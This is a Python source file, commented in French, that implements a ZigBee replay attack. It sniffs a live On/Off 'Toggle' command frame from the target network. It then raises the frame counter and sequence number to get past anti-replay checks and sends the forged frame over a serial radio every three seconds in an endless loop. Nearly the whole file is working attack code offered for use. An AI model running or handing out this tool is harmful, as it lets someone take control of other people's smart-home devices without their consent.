"""
Module : zigbee_replay_attack
=============================

Ce module implémente une attaque de replay sur le réseau ZigBee.

Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee.
Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.

Classes:
    ZigbeeReplayAttack: Classe principale pour effectuer l'attaque de replay.

Exemple d'utilisation:
    >>> from zigbee_replay_attack import ZigbeeReplayAttack
    >>> attaque = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0', aes_key='ma_cle_aes')
    >>> attaque.lancer_attaque_replay(capture_live=True)
"""

import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
from typing import Dict, Optional, List
from Cryptodome.Cipher import AES

from CodeurTrame import CodeurTrameZigbee
from DecodeurTrame import DecodeurTrameZigbee
from sniff import SniffeurZigbee
from frame_counter import ZigbeeFrameFinder

# Configuration du logging pour suivre l'exécution et enregistrer les événements
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)


class ZigbeeReplayAttack:
    """
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.

    Cette classe permet de :
        - Capturer des trames ZigBee en direct ou depuis un fichier.
        - Analyser et filtrer les trames capturées.
        - Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
        - Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.

    Attributs:
        capture_file (str): Nom du fichier de capture des trames (par défaut 'captures_zigbee.json').
        channel (int): Canal ZigBee utilisé pour l'attaque (par défaut 13).
        pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
        serial_port (Optional[str]): Port série pour l'envoi des trames.
        aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
        codeur (CodeurTrameZigbee): Instance de l'encodeur de trame ZigBee.
        decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
        sniffer (SniffeurZigbee): Instance pour la capture des trames.
        framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
        captures (list): Liste des trames capturées.
        replay_queue (queue.Queue): File d'attente pour la gestion des trames à rejouer.
    """

    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None,
        materiel: str = 'nrf52'
    ):
        """
        Initialise l'attaque de replay ZigBee.

        Paramètres:
            capture_file (str): Nom du fichier de capture (par défaut 'captures_zigbee.json').
            channel (int): Canal ZigBee (par défaut 13).
            pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
            serial_port (Optional[str]): Port série pour l'envoi des trames.
            aes_key (Optional[str]): Clé AES pour la sécurité des trames, si applicable.
        """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200,
            materiel=materiel
        )
        self.framefinder = ZigbeeFrameFinder()
        self.captures = []
        self.replay_queue = queue.Queue()

    def attendre_trame_data(self, timeout: int = 30) -> Optional[str]:
        """
        Capture en direct une trame ZigBee de type Data correspondant au toggle.

        La fonction démarre le sniffer et attend qu'une trame de type 'Data'
        provenant du cluster 0600 avec un command_id égal à '02' et une longueur de trame inférieure à 100
        soit capturée. Une fois la trame correspondante trouvée, elle est décodée et renvoyée.

        Paramètres:
            timeout (int): Durée maximale d'attente en secondes (par défaut 30).

        Retourne:
            Optional[str]: La trame ZigBee capturée sous forme de chaîne hexadécimale, ou None si aucune trame n'est trouvée.
        """
        self.sniffer.reinitialiser() 
        logger.info("Attente d'une trame Toggle...")
        self.sniffer.demarrer_sniffer()
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.sniffer.captures:
                for capture in self.sniffer.captures:
                    try:
                        
                        # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                        if (capture.get('type_trame') == 'Data' and
                            capture.get('couche_aps', {}).get('cluster_id', '').lower() == '0600' and
                            capture.get('couche_zcl', {}).get('command_id', '').lower() == '02') and len(capture['metadonnees']['trame_brute']) < 100:
                            
                            hex_data = capture['metadonnees']['trame_brute']
                            
                            # Décodage de la trame pour affichage (facultatif)
                            decode = DecodeurTrameZigbee()
                            octets = bytes.fromhex(hex_data)
                            print(decode.decoder_trame_data(octets))
                            
                            logger.info("Trame Toggle détectée")
                            
                            self.sniffer.arreter_sniffer()
                            self.sniffer.reinitialiser()
                            return hex_data
                        else:
                            # Afficher la trame si elle n'est pas conforme aux critères et la supprimer
                            if capture.get('type_trame') == 'Data' and len(capture['metadonnees']['trame_brute']) < 95:
                                print(capture['metadonnees']['trame_brute'])
                            self.sniffer.captures.remove(capture)
                    except KeyError:
                        continue
            time.sleep(0.1)
            
        self.sniffer.arreter_sniffer()
        logger.error("Timeout: Aucune trame Toggle trouvée")
        return None

    def envoyer_trames_en_boucle(self):
        """
        Envoie en boucle des trames de replay sur le réseau ZigBee.

        La fonction récupère d'abord une trame initiale (en attente d'une trame Toggle)
        puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
        et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.

        Remarque:
            La trame initiale est tronquée de ses 4 derniers octets avant d'être traitée.
        """
        trame_initiale = self.attendre_trame_data() #"6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202"#
        if not trame_initiale:
            return
        
        # Suppression des 4 derniers octets de la trame initiale
        trame_initiale = trame_initiale[:-4]
        print("Trame initiale : ", trame_initiale)
        
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début de l'envoi sur {self.serial_port}")
                if self.sniffer.materiel == 'esp32h2':
                    ser.write(bytes("#CMD#MODE_TX",'utf-8'))
                # Modification de la trame en incrémentant le compteur de trame
                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                print("Trame modifiée : ", trame_modifiee)
                trame_bytes = bytes.fromhex(trame_modifiee)

                # Envoi en boucle de la trame modifiée
                while True:
                    try:
                        # Préfixe de trame ('61') ajouté à la trame modifiée
                        ser.write(bytes.fromhex('61') + trame_bytes)
                        logger.debug(f"Trame envoyée : {trame_bytes.hex()}")
                        time.sleep(3) 
                        print("Trame envoyée : ", trame_bytes.hex())
                        
                        # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                        trame_bytes = bytes.fromhex(trame_modifiee)
                        print("Trame modifiée (extrait compteur) : ", trame_bytes.hex()[-8:-6])
                        
                    except Exception as e:
                        logger.error(f"Erreur d'envoi : {e}")
                        break
        except serial.SerialException as e:
            logger.error(f"Erreur port série : {e}")

    def lancer_attaque_replay(self, capture_live: bool = True):
        """
        Lance l'attaque de replay sur le réseau ZigBee.

        Selon le paramètre capture_live, la fonction capture en direct les trames ou
        utilise un fichier de capture existant. Elle démarre ensuite un thread qui
        exécute l'envoi en boucle des trames de replay.

        Paramètres:
            capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.

        Exceptions:
            Toute exception survenue lors de l'exécution de l'attaque est logguée.
        """
        try:
            if capture_live:
                logger.info("Mode capture live activé")
            else:
                with open(self.capture_file, 'r') as f:
                    self.captures = json.load(f)

            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
            thread_replay.start()
            thread_replay.join()

        except Exception as e:
            logger.error(f"Échec de l'attaque : {e}")
